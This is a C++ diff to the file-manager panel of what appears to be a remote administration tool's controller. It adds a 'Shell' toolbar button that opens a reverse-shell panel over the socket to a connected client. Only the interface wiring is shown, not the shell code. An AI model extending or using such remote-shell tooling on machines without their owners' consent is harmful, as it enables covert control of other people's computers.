@@ -1,4 +1,5 @@
 ﻿#include "panel_file_manager.hpp"
+#include "panel_reverse_shell.hpp"
 #include "frame_client.hpp"
 #include "file_editor.hpp"
 #include "file_encryption.hpp"
@@ -99,6 +100,7 @@ panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _s
 	wxBitmap newFolder(wxT(".\\imgs\\folder.png"), wxBITMAP_TYPE_PNG);
 	wxBitmap uploadBitmap(wxT(".\\imgs\\upload.png"), wxBITMAP_TYPE_PNG);
 	wxBitmap deleteBitmap(wxT(".\\imgs\\trash-can.png"), wxBITMAP_TYPE_PNG);
+	wxBitmap shellBitmap(wxT(".\\imgs\\terminal.png"), wxBITMAP_TYPE_PNG);
 	
 	wxBitmap documentsBitmap(wxT(".\\imgs\\documents-folder.png"), wxBITMAP_TYPE_PNG);
 	
@@ -111,6 +113,8 @@ panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _s
 	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Refresh, wxT("Refrescar"), refreshBitmap, "Refrescar");
 	this->p_ToolBar->AddSeparator();
 	this->p_ToolBar->AddTool(EnumMenuFM::ID_Eliminar, wxT("Eliminar"), deleteBitmap, "Eliminar");
+	this->p_ToolBar->AddSeparator();
+	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Shell, wxT("Shell"), shellBitmap, "Shell");
 	this->p_ToolBar->Realize();
 
 	//boton para subir carpeta (regresar) 
@@ -277,6 +281,10 @@ void panelFileManager::OnToolBarClick(wxCommandEvent& event) {
 				});
 				thEnviar.detach();
 			}
+			break;
+		case EnumIDS::ID_Panel_FM_Shell:
+			panelReverseShell* panelShell = new panelReverseShell(this, this->sckCliente, this->strID, this->enc_key, this->RutaActual().ToStdString());
+			panelShell->Show();
 			break;
 	}
 }
